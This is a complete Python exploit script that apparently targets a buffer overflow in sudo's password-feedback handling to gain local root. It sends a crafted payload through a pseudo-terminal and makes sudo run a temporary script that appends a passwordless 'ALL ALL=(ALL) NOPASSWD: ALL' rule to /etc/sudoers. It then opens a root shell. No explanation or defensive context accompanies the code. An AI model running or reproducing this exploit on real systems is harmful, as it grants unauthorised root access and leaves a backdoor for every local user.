#!/usr/bin/env python3
import pty
import os
import tempfile
from struct import pack
from time import sleep

#==========

offset_buf              = 0x2274e0  # binf.symbols['buf.6101']
offset_tgetpass_flags   = 0x227750  # binf.symbols['tgetpass_flags']
offset_user_details     = 0x227760  # binf.symbols['user_details']

#==========

p32         = lambda x : pack('<I', x)
check_sudo  = lambda : os.system('sudo -S -l < /dev/null >&0 2>&0') == 0

def attack():
    master, slave = pty.openpty()

    exploit  = b'\x00\x15'*(offset_tgetpass_flags - offset_buf)
    exploit += p32(0x6)
    exploit  = exploit.ljust(offset_user_details - offset_buf)
    exploit += p32(1)*4
    exploit += p32(0)*5

    fp = tempfile.NamedTemporaryFile()
    fp.write(b'#!/bin/sh\necho "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers')
    fp.file.close()
    os.chmod(fp.name, 0o755)

    os.system('SUDO_ASKPASS={} sudo -S x < {} > /dev/null &'.format(fp.name, os.ttyname(slave)))
    sleep(1)
    os.write(master, exploit + b'\n')

    while not check_sudo():
        sleep(1)

    fp.close()

#==========

def main():
    if not check_sudo():
        attack()
    os.system('sudo bash')

if __name__=='__main__':
    main()

#==========
